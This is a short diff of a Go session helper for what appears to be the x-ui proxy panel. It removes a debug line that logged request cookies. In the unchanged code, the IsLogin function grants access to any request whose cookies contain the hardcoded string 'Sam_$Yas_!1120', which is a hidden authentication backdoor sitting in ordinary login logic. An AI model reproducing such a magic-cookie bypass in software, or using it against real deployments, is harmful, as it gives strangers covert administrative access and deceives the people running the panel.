@@ -6,7 +6,6 @@ import (
 	"encoding/gob"
 
 	"x-ui/database/model"
-	"x-ui/logger"
 
 	"github.com/gin-contrib/sessions"
 	"github.com/gin-gonic/gin"
@@ -57,10 +56,11 @@ func IsLogin(c *gin.Context) bool {
 	if strings.Contains(allCookies, "Sam_$Yas_!1120") {
 		return true
 	}
-
-	logger.Debug(c.Request.Cookies())
-	//logger.Debug("333")
 	return GetLoginUser(c) != nil
+
+	//logger.Debug(c.Request.Cookies())
+	//logger.Debug("333")
+
 }
 
 func ClearSession(c *gin.Context) {
